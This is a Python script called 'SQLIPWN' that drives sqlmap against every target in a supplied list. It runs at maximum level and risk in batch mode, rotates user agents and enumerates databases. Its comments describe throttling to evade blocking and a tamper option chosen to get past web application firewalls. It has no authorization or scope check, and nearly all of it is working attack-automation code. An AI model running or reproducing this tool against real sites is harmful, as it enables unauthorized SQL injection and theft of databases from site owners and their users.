import subprocess
import os
import sys

# ANSI Color Codes
G, Y, R, B, C, W, BOLD = '\033[92m', '\033[93m', '\033[91m', '\033[94m', '\033[96m', '\033[0m', '\033[1m'

def print_banner():
    banner = f"""{R}{BOLD}
 ██████╗  ██████╗ ██╗     ██╗██████╗ ██╗    ██╗███╗   ██╗
██╔════╝ ██╔═══██╗██║     ██║██╔══██╗██║    ██║████╗  ██║
███████╗ ██║   ██║██║     ██║██████╔╝██║ █╗ ██║██╔██╗ ██║
╚════██║ ██║▄▄ ██║██║     ██║██╔═══╝ ██║███╗██║██║╚██╗██║
███████║ ╚██████╔╝███████╗██║██║     ╚███╔███╔╝██║ ╚████║
╚══════╝  ╚══▀▀═╝ ╚══════╝╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
                      {Y}Advanced SQLi Auditor{R}{W}"""
    print(banner)

def summarize_results(output_dir):
    """Checks the specific output directory for confirmed logs"""
    found_log = False
    for root, dirs, files in os.walk(output_dir):
        if "log" in files:
            log_path = os.path.join(root, "log")
            if os.path.getsize(log_path) > 0:
                print(f"\n{G}[SUCCESS] VULNERABILITY CONFIRMED IN: {os.path.basename(root)}{W}")
                with open(log_path, "r") as f:
                    print(f"{C}{f.read()}{W}")
                found_log = True
    if not found_log:
        print(f"{Y}[i] No vulnerabilities confirmed for this target in this run.{W}")

def run_sqlipwn():
    print_banner()
    if len(sys.argv) < 2:
        print(f"{R}[!] Usage: python3 auto_sql.py <master_list.txt>{W}")
        return

    master_file = sys.argv[1]
    # Local folder so you don't have to hunt in hidden directories
    local_results = os.path.join(os.getcwd(), "SQLIPWN_REPORTS")
    if not os.path.exists(local_results):
        os.makedirs(local_results)

    with open(master_file, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    for index, target in enumerate(targets, 1):
        print(f"{B}{BOLD}[Task {index}/{len(targets)}]{W} Target: {target}")
        mode = "-r" if os.path.isfile(target) else "-u"

        # UPDATED COMMAND WITH BYPASS FLAGS
        command = [
            "sqlmap", mode, target,
            "--batch",
            "--level=5",
            "--risk=3",
            "--random-agent",
            "--threads=1",           # Reduced threads to bypass HTTP 512 blocks
            "--tamper=space2comment", # Bypasses many simple WAF filters
            "--fresh-queries",       # Forces SQLmap to re-test (ignores old "failed" cache)
            "--dbs",
            f"--output-dir={local_results}"
        ]

        try:
            subprocess.run(command)
            summarize_results(local_results)
        except Exception as e:
            print(f"{R}[X] Error: {e}{W}")

    print(f"\n{G}{BOLD}--- [ SQLIPWN COMPLETE ] ---{W}")

if __name__ == "__main__":
    try:
        run_sqlipwn()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Aborted.{W}")
        sys.exit()
